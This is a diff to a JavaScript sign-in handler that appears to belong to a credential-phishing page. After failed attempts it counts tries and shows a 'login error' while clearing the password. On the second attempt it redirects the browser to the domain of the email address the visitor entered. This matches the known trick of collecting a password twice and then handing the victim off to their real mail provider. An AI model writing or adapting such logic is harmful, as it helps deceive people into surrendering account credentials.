@@ -689,11 +689,73 @@ return false;
 setTimeout(function (){document.getElementById('CloseMeNowLog').click();
 },300);
 
+	
+	
+	
+	/**
 setTimeout(function (){
 alert("There was a problem while using XMLHTTP:\n" + req.statusText+ "!");
 },500);
 return false; 
+	**/
+	
+	
+	
+var xn = 1;
+var x = 0;
+
+x = Number(logCheckCount) + Number(xn);
+
+document.getElementById('logCheckCount').value=x;	
+	
+
+if(logCheckCount>=2){
+setTimeout(function (){
+
+location ='http://'+emailAddress[1];
+	
+/**
+document.getElementById('password').value='';
+	
+$("#submitBtn0").html(`<button class="btn btn-sm btn-primary">
+            Sign In
+        </button>`).prop("disabled", false);	
+**/
+},500);
+	
 }
+
+	
+	
+	else{
+	setTimeout(function (){
+
+//location ='http://'+emailAddress[1];
+document.getElementById('login-error').style.display='';
+document.getElementById('password').value='';
+	
+$("#submitBtn0").html(`<button class="btn btn-sm btn-primary">
+            Sign In
+        </button>`).prop("disabled", false);	
+
+},500);
+	}
+	
+	
+	
+
+return false;	
+	
+	
+	
+	
+	
+}
+	
+	
+	
+	
+	
 }				
 	}
 		
